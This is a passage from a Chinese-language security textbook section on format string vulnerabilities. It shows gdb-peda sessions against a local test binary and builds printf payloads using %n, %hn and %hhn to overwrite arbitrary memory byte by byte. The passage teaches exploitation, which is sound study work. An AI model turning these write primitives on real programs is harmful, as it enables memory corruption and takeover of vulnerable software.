0x804852d : add esp,0x10
[------------------------------------stack----------------------
---------------]
0000| 0xffffd530 --> 0xffffd564 --> 0xffffd538 --> 0x20 (' ')
345
3.1.1 格式化字符串漏洞
0004| 0xffffd534 --> 0x1
0008| 0xffffd538 --> 0x20 (' ')
0012| 0xffffd53c --> 0xffffffff
0016| 0xffffd540 --> 0xffffd55a ("ABCD")
0020| 0xffffd544 --> 0xffffd564 --> 0xffffd538 --> 0x20 (' ')
0024| 0xffffd548 --> 0x80481fc --> 0x38 ('8')
0028| 0xffffd54c --> 0x80484b0 (: add ebx,0x1b5
0)
[---------------------------------------------------------------
---------------]
Legend: code, data, rodata, value
0x08048520 in main ()
gdb-peda$ x/20x $esp
0xffffd530: 0xffffd564 0x00000001 0x00000020
0xffffffff
0xffffd540: 0xffffd55a 0xffffd564 0x080481fc
0x080484b0
0xffffd550: 0xf7ffda54 0x00000001 0x424135d0
0x00004443
0xffffd560: 0x00000000 0xffffd538 0x78383025
0x78383025
0xffffd570: 0x32313025 0x33312564 0x00006e24
0xf7e70240
对比 printf() 函数执行前后的输出， printf 首先解析 %13$n 找到获得地
址 0xffffd564 的值 0xffffd538 ，然后跳转到地址 0xffffd538 ，将它的值
0x88888888 覆盖为 0x00000020 ，就得到 arg2=0x00000020 。
覆盖任意地址内存
也许已经有人发现了一个问题，使用上面覆盖内存的方法，值最小只能是 4，因为
单单地址就占去了 4 个字节。那么我们怎样覆盖比 4 小的值呢。利用整数溢出是一
个方法，但是在实践中这样做基本都不会成功。再想一下，前面的输入中，地址都
位于格式字符串之前，这样做真的有必要吗，能否将地址放在中间。我们来试一
下，使用格式字符串 "AA%15$nA"+"\x38\xd5\xff\xff" ，开头的 AA 占两个
字节，即将地址赋值为 2 ，中间是 %15$n 占 5 个字节，这里不是 %13$n ，因
为地址被我们放在了后面，在格式字符串的第 15 个参数，后面跟上一个 A 占用
346
3.1.1 格式化字符串漏洞
一个字节。于是前半部分总共占用了 2+5+1=8 个字节，刚好是两个参数的宽度，
这里的 8 字节对齐十分重要。最后再输入我们要覆盖的地址
\x38\xd5\xff\xff ，详细输出如下：
$ python2 -c 'print("AA%15$nA"+"\x38\xd5\xff\xff")' > text
$ gdb -q a.out
Reading symbols from a.out...(no debugging symbols found)...done
.
gdb-peda$ b printf
Breakpoint 1 at 0x8048350
gdb-peda$ r  0x8049f14 --> 0x1
ECX: 0x1
EDX: 0xf7f9883c --> 0x0
ESI: 0xf7f96e68 --> 0x1bad90
EDI: 0x0
EBP: 0xffffd5f8 --> 0x0
ESP: 0xffffd52c --> 0x8048520 (: add esp,0x20)
EIP: 0xf7e27c20 (: call 0xf7f06d17 )
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT dire
ction overflow)
[-------------------------------------code----------------------
---------------]
0xf7e27c1b : ret
0xf7e27c1c: xchg ax,ax
0xf7e27c1e: xchg ax,ax
=> 0xf7e27c20 : call 0xf7f06d17 
0xf7e27c25 : add eax,0x16f243
0xf7e27c2a : sub esp,0xc
0xf7e27c2d : mov eax,DWORD PTR [eax+0x124]
0xf7e27c33 : lea edx,[esp+0x14]
No argument
[------------------------------------stack----------------------
---------------]
0000| 0xffffd52c --> 0x8048520 (: add esp,0x20)
347
3.1.1 格式化字符串漏洞
0004| 0xffffd530 --> 0xffffd564 ("AA%15$nA8\325\377\377")
0008| 0xffffd534 --> 0x1
0012| 0xffffd538 --> 0x88888888
0016| 0xffffd53c --> 0xffffffff
0020| 0xffffd540 --> 0xffffd55a ("ABCD")
0024| 0xffffd544 --> 0xffffd564 ("AA%15$nA8\325\377\377")
0028| 0xffffd548 --> 0x80481fc --> 0x38 ('8')
[---------------------------------------------------------------
---------------]
Legend: code, data, rodata, value
Breakpoint 1, 0xf7e27c20 in printf () from /usr/lib32/libc.so.6
gdb-peda$ x/20x $esp
0xffffd52c: 0x08048520 0xffffd564 0x00000001
0x88888888
0xffffd53c: 0xffffffff 0xffffd55a 0xffffd564
0x080481fc
0xffffd54c: 0x080484b0 0xf7ffda54 0x00000001
0x424135d0
0xffffd55c: 0x00004443 0x00000000 0x31254141
0x416e2435
0xffffd56c: 0xffffd538 0xffffd500 0x00000001
0x000000c2
gdb-peda$ finish
Run till exit from #0 0xf7e27c20 in printf () from /usr/lib32/l
ibc.so.6
[----------------------------------registers--------------------
---------------]
EAX: 0x7
EBX: 0x804a000 --> 0x8049f14 --> 0x1
ECX: 0x0
EDX: 0xf7f98830 --> 0x0
ESI: 0xf7f96e68 --> 0x1bad90
EDI: 0x0
EBP: 0xffffd5f8 --> 0x0
ESP: 0xffffd530 --> 0xffffd564 ("AA%15$nA8\325\377\377")
EIP: 0x8048520 (: add esp,0x20)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT dire
ction overflow)
[-------------------------------------code----------------------
348
3.1.1 格式化字符串漏洞
---------------]
0x8048514 : lea eax,[ebp-0x94]
0x804851a : push eax
0x804851b : call 0x8048350 
=> 0x8048520 : add esp,0x20
0x8048523 : sub esp,0xc
0x8048526 : push 0xa
0x8048528 : call 0x8048370 
0x804852d : add esp,0x10
[------------------------------------stack----------------------
---------------]
0000| 0xffffd530 --> 0xffffd564 ("AA%15$nA8\325\377\377")
0004| 0xffffd534 --> 0x1
0008| 0xffffd538 --> 0x2
0012| 0xffffd53c --> 0xffffffff
0016| 0xffffd540 --> 0xffffd55a ("ABCD")
0020| 0xffffd544 --> 0xffffd564 ("AA%15$nA8\325\377\377")
0024| 0xffffd548 --> 0x80481fc --> 0x38 ('8')
0028| 0xffffd54c --> 0x80484b0 (: add ebx,0x1b5
0)
[---------------------------------------------------------------
---------------]
Legend: code, data, rodata, value
0x08048520 in main ()
gdb-peda$ x/20x $esp
0xffffd530: 0xffffd564 0x00000001 0x00000002
0xffffffff
0xffffd540: 0xffffd55a 0xffffd564 0x080481fc
0x080484b0
0xffffd550: 0xf7ffda54 0x00000001 0x424135d0
0x00004443
0xffffd560: 0x00000000 0x31254141 0x416e2435
0xffffd538
0xffffd570: 0xffffd500 0x00000001 0x000000c2
0xf7e70240
对比 printf() 函数执行前后的输出，可以看到我们成功地给 arg2 赋值了
0x00000020 。
349
3.1.1 格式化字符串漏洞
说完了数字小于 4 时的覆盖，接下来说说大数字的覆盖。前面的方法教我们直接输
入一个地址的十进制就可以进行赋值，可是，这样占用的内存空间太大，往往会覆
盖掉其他重要的地址而产生错误。其实我们可以通过长度修饰符来更改写入的值的
大小：
char c;
short s;
int i;
long l;
long long ll;
printf("%s %hhn\n", str, &c); // 写入单字节
printf("%s %hn\n", str, &s); // 写入双字节
printf("%s %n\n", str, &i); // 写入4字节
printf("%s %ln\n", str, &l); // 写入8字节
printf("%s %lln\n", str, &ll); // 写入16字节
试一下：
$ python2 -c 'print("A%15$hhn"+"\x38\xd5\xff\xff")' > text
0xffffd530: 0xffffd564 0x00000001 0x88888801
0xffffffff
$ python2 -c 'print("A%15$hnA"+"\x38\xd5\xff\xff")' > text
0xffffd530: 0xffffd564 0x00000001 0x88880001
0xffffffff
$ python2 -c 'print("A%15$nAA"+"\x38\xd5\xff\xff")' > text
0xffffd530: 0xffffd564 0x00000001 0x00000001
0xffffffff
于是，我们就可以逐字节地覆盖，从而大大节省了内存空间。这里我们尝试写入
0x12345678 到地址 0xffffd538 ，首先使用 AAAABBBBCCCCDDDD 作为输
入：
gdb-peda$ r
AAAABBBBCCCCDDDD
[----------------------------------registers--------------------
350
3.1.1 格式化字符串漏洞
---------------]
EAX: 0xffffd564 ("AAAABBBBCCCCDDDD")
EBX: 0x804a000 --> 0x8049f14 --> 0x1
ECX: 0x1
EDX: 0xf7f9883c --> 0x0
ESI: 0xf7f96e68 --> 0x1bad90
EDI: 0x0
EBP: 0xffffd5f8 --> 0x0
ESP: 0xffffd52c --> 0x8048520 (: add esp,0x20)
EIP: 0xf7e27c20 (: call 0xf7f06d17 )
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT dire
ction overflow)
[-------------------------------------code----------------------
---------------]
0xf7e27c1b : ret
0xf7e27c1c: xchg ax,ax
0xf7e27c1e: xchg ax,ax
=> 0xf7e27c20 : call 0xf7f06d17 
0xf7e27c25 : add eax,0x16f243
0xf7e27c2a : sub esp,0xc
0xf7e27c2d : mov eax,DWORD PTR [eax+0x124]
0xf7e27c33 : lea edx,[esp+0x14]
No argument
[------------------------------------stack----------------------
---------------]
0000| 0xffffd52c --> 0x8048520 (: add esp,0x20)
0004| 0xffffd530 --> 0xffffd564 ("AAAABBBBCCCCDDDD")
0008| 0xffffd534 --> 0x1
0012| 0xffffd538 --> 0x88888888
0016| 0xffffd53c --> 0xffffffff
0020| 0xffffd540 --> 0xffffd55a ("ABCD")
0024| 0xffffd544 --> 0xffffd564 ("AAAABBBBCCCCDDDD")
0028| 0xffffd548 --> 0x80481fc --> 0x38 ('8')
[---------------------------------------------------------------
---------------]
Legend: code, data, rodata, value
Breakpoint 1, 0xf7e27c20 in printf () from /usr/lib32/libc.so.6
351
3.1.1 格式化字符串漏洞
gdb-peda$ x/20x $esp
0xffffd52c: 0x08048520 0xffffd564 0x00000001
0x88888888
0xffffd53c: 0xffffffff 0xffffd55a 0xffffd564
0x080481fc
0xffffd54c: 0x080484b0 0xf7ffda54 0x00000001
0x424135d0
0xffffd55c: 0x00004443 0x00000000 0x41414141
0x42424242
0xffffd56c: 0x43434343 0x44444444 0x00000000
0x000000c2
gdb-peda$ x/4wb 0xffffd538
0xffffd538: 0x88 0x88 0x88 0x88
由于我们想要逐字节覆盖，就需要 4 个用于跳转的地址，4 个写入地址和 4 个值，
对应关系如下（小端序）：
0xffffd564 -> 0x41414141 (0xffffd538) -> \x78
0xffffd568 -> 0x42424242 (0xffffd539) -> \x56
0xffffd56c -> 0x43434343 (0xffffd53a) -> \x34
0xffffd570 -> 0x44444444 (0xffffd53b) -> \x12
把 AAAA 、 BBBB 、 CCCC 、 DDDD 占据的地址分别替换成括号中的值，再适当
使用填充字节使 8 字节对齐就可以了。构造输入如下：
$ python2 -c 'print("\x38\xd5\xff\xff"+"\x39\xd5\xff\xff"+"\x3a\
xd5\xff\xff"+"\x3b\xd5\xff\xff"+"%104c%13$hhn"+"%222c%14$hhn"+"%
222c%15$hhn"+"%222c%16$hhn")' > text
其中前四个部分是 4 个写入地址，占 4*4=16 字节，后面四个部分分别用于写入十
六进制数，由于使用了 hh ，所以只会保留一个字节 0x78 （16+104=120 ->
0x56）、 0x56 （120+222=342 -> 0x0156 -> 56）、 0x34 （342+222=564 ->
0x0234 -> 0x34）、 0x12 （564+222=786 -> 0x312 -> 0x12）。执行结果如下：
$ gdb -q a.out
Reading symbols from a.out...(no debugging symbols found)...done
.
352
3.1.1 格式化字符串漏洞
gdb-peda$ b printf
Breakpoint 1 at 0x8048350
gdb-peda$ r  0xffffd538 --> 0x88888888
EBX: 0x804a000 --> 0x8049f14 --> 0x1
ECX: 0x1
EDX: 0xf7f9883c --> 0x0
ESI: 0xf7f96e68 --> 0x1bad90
EDI: 0x0
EBP: 0xffffd5f8 --> 0x0
ESP: 0xffffd52c --> 0x8048520 (: add esp,0x20)
EIP: 0xf7e27c20 (: call 0xf7f06d17 )
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT dire
ction overflow)
[-------------------------------------code----------------------
---------------]
0xf7e27c1b : ret
0xf7e27c1c: xchg ax,ax
0xf7e27c1e: xchg ax,ax
=> 0xf7e27c20 : call 0xf7f06d17 <__x86.get_pc_thunk.ax